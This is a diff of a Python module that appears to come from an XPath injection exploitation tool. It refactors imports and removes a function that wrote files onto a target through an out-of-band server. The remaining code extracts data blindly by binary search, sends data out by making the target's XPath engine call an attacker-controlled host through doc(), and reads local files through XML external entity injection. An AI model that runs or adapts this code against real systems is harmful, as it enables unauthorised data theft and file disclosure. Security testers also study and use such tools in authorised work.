@@ -2,24 +2,21 @@ import asyncio
 import base64
 import string as stdlib_string
 
-from xcat import oob
-from xcat.attack import AttackContext, check
-from xpath import ROOT_NODE
-from xpath.functions import (concat, count as xpath_count, doc, encode_for_uri,
-                             normalize_space, string, string_length,
-                             string_to_codepoints, substring, substring_before,
-                             doc_available as xpath_doc_available)
-from xpath.functions.fs import base_64_binary, write_binary
+from xpath import ROOT_NODE, func, Functions
 
+from . import oob
+from .attack import AttackContext, check
 from .display import XMLNode
+
+fs_func = Functions('Q{http://expath.org/ns/file}')
 
 ASCII_SEARCH_SPACE = stdlib_string.digits + stdlib_string.ascii_letters + '+./:@_ -,()!'
 MISSING_CHARACTER = "?"
 
 
-async def count(context: AttackContext, expression, func=xpath_count):
+async def count(context: AttackContext, expression, count_func=func.count):
     if context.features['oob-http']:
-        result = await get_string_via_oob(context, string(func(expression)))
+        result = await get_string_via_oob(context, func.string(count_func(expression)))
         if result is not None and result.isdigit():
             return int(result)
 
@@ -60,7 +57,7 @@ async def get_common_string(context: AttackContext, expression, length):
 
 async def get_string(context: AttackContext, expression, disable_normalization=False):
     if context.features['normalize-space'] and not disable_normalization:
-        expression = normalize_space(expression)
+        expression = func.normalize_space(expression)
 
     if context.features['oob-http']:
         result = await get_string_via_oob(context, expression)
@@ -69,7 +66,7 @@ async def get_string(context: AttackContext, expression, disable_normalization=F
         else:
             pass
 
-    total_string_length = await count(context, expression, func=string_length)
+    total_string_length = await count(context, expression, count_func=func.string_length)
 
     if total_string_length == 0:
         return ""
@@ -82,7 +79,7 @@ async def get_string(context: AttackContext, expression, disable_normalization=F
     fetch_length = total_string_length if not context.fast_mode else min(15, total_string_length)
 
     chars_futures = [
-        get_char(context, substring(expression, i, 1))
+        get_char(context, func.substring(expression, i, 1))
         for i in range(1, fetch_length + 1)
     ]
 
@@ -102,46 +99,34 @@ async def get_string(context: AttackContext, expression, disable_normalization=F
     return result
 
 
-async def upload_file_via_oob(context: AttackContext, remote_path, file_bytes: bytes):
-    encoded = base64.encodebytes(file_bytes)
-    server = await requester.get_oob_server()
-    url, future = server.expect_file_download(encoded.decode())
-
-    await check(context, write_binary(remote_path, base_64_binary(doc(url) / 'data')))
-
-    try:
-        return await asyncio.wait_for(future, timeout=5)
-    except asyncio.TimeoutError:
-        return False
-
-
 async def get_string_via_oob(context: AttackContext, expression):
     identifier, future = oob.expect_data(context.oob_app)
     url = f'{context.oob_host}/data/{identifier}?d='
-    oob_expr = doc(concat(url, encode_for_uri(expression))) / 'data' == context.oob_app['test_response_value']
+    url_expr = func.concat(url, func.encode_for_uri(expression))
+    oob_expr = func.doc(url_expr) / 'data' == context.oob_app['test_response_value']
     if not await check(context, oob_expr):
         await asyncio.sleep(10000)
         return None
 
     try:
-        return await asyncio.wait_for(future, timeout=1000)
+        return await asyncio.wait_for(future, timeout=3)
     except asyncio.TimeoutError:
         return None
 
 
 async def doc_available(context: AttackContext, path):
-    return await check(context, xpath_doc_available(path))
+    return await check(context, func.doc_available(path))
 
 
 async def get_file_via_entity_injection(context: AttackContext, file_path):
     identifier, future = oob.expect_entity_injection(context.oob_app, f'SYSTEM "{file_path}"')
     url = f'{context.oob_host}/entity/{identifier}'
-    return await get_string_via_oob(context, doc(url) / 'data')
+    return await get_string_via_oob(context, func.doc(url) / 'data')
 
 
-def iterate_all(context: AttackContext, expressions):
+def iterate_all(context: AttackContext, expressions, **kwargs):
     for text in expressions:
-        yield get_string(context, text)
+        yield get_string(context, text, **kwargs)
 
 
 async def get_all_text(context: AttackContext, expression):
@@ -189,7 +174,7 @@ async def substring_search(context: AttackContext, expression):
 
     result = await binary_search(
         context,
-        string_length(substring_before(ASCII_SEARCH_SPACE, expression)),
+        func.string_length(func.substring_before(ASCII_SEARCH_SPACE, expression)),
         min=0,
         max=len(ASCII_SEARCH_SPACE))
     if result == 0:
@@ -201,7 +186,7 @@ async def substring_search(context: AttackContext, expression):
 async def codepoint_search(context: AttackContext, expression):
     result = await binary_search(
         context,
-        expression=string_to_codepoints(expression),
+        expression=func.string_to_codepoints(expression),
         min=0,
         max=255)
     if result == 0:
